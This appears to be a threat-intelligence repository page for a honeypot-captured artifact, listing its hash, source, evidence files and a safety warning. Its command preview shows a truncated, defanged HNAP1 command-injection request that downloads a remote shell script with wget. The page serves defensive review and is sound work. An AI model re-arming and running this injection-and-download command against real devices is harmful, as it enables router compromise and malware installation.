# b052f6dce95f054cb176f097cfc67c38365ff978c3b97f742bd3879c151b9472

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `b052f6dce95f054cb176f097cfc67c38365ff978c3b97f742bd3879c151b9472` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /HNAP1/GetDeviceSettings/`cd /tmp;rm -f .s;wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O .s;busybox wget hxxp://91[.]92[.]40[.]XXX/w
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
